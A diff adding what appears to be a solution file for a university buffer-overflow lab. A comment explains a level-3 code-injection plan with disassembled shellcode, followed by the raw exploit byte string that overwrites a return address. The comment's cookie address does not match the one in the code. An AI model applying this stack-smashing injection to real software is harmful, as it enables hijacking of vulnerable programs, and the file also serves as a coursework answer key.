@@ -1,0 +1,27 @@
+/*
+ * We still inject our code at the same address in Level 1. But we should do:
+ * 1) Change the value of %rdi to the address of *string* representation of
+ *    `cookie` located at 0x6044e4 (stored in 0x401991 among lots of `nop`);
+ * 2) Reset %rsp to the address when last return is occured;
+ * 3) Write the return address at the chosen address - not that of %rsp, but the
+ *    pointed address of the register;
+ * 4) Write cookie string (big-endian) to address followed by NULL.
+ *
+ * The injected assembly code is like below:
+ *
+ * Disassembly of section .text:
+ *
+ * 0000000000000000 <_start>:
+ *    0:   bf 20 41 60 00          mov    $0x604120,%edi
+ *    5:   48 83 ec 08             sub    $0x8,%rsp
+ *    9:   48 c7 04 24 fa 18 40    movq   $0x4018fa,(%rsp)
+ *   10:   00
+ *   # Move the 8-byte string in two instructions for `movq` complains about
+ *   # mismatched operands.
+ *   # There is no need to add the terminate char 0x00 for that area is full of
+ *   # zeros.
+ *   11:   c7 07 35 39 62 39       movl   $0x39623935,(%rdi)
+ *   17:   c7 47 04 39 37 66 61    movl   $0x61663739,0x4(%rdi)
+ *   1e:   c3                      ret
+ */
+01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 A8 DC 61 55 00 00 00 00 BF 20 41 60 00 48 83 EC 08 48 C7 04 24 FA 18 40 00 C7 07 35 39 62 39 C7 47 04 39 37 66 61 C3
